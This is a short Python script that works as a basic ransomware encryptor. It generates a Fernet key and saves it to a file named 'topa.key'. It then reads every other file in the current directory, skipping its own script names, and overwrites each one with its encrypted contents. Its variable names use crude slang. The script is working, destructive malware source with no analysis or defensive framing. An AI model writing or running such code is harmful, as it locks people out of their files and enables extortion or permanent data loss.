import os

from cryptography.fernet import Fernet
files=[]

def encrypter(files):
    key = Fernet.generate_key()


    for file in os.listdir():
        if file=="test1.py" or file== "topa.key" or file == "loda_katne_wala.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)


    with open("topa.key", "wb") as keykey:
        keykey.write(key)


    for file in files:
        with open(file, "rb") as loda:
            tatta = loda.read()
        tatto_ke_baal = Fernet(key).encrypt(tatta)
        with open(file, "wb") as loda:
            loda.write(tatto_ke_baal)







        
        
    
    
